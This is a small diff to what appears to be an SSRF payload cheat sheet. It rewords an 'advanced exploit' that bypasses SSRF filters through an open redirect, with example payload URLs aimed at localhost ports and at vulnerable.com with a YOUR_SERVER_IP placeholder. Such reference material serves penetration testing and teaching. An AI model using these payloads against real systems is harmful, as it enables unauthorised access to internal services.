@@ -79,11 +79,11 @@ http://localhost:443
 http://localhost:22
 ```
 
-Advanced exploit [using a redirection](https://portswigger.net/web-security/ssrf#bypassing-ssrf-filters-via-open-redirection)
+Advanced exploit [using a redirect](https://portswigger.net/web-security/ssrf#bypassing-ssrf-filters-via-open-redirection)
 
 ```powershell
-1. Create a subdomain pointing to 192.168.0.1 with DNS A record  e.g:ssrf.example.com
-2. Launch the SSRF: vulnerable.com/index.php?url=http://YOUR_SERVER_IP
+1. Create a page on a whitelisted host that redirects requests to the SSRF the target URL (e.g. 192.168.0.1)
+2. Launch the SSRF pointing to  vulnerable.com/index.php?url=http://YOUR_SERVER_IP
 vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1
 ```
 
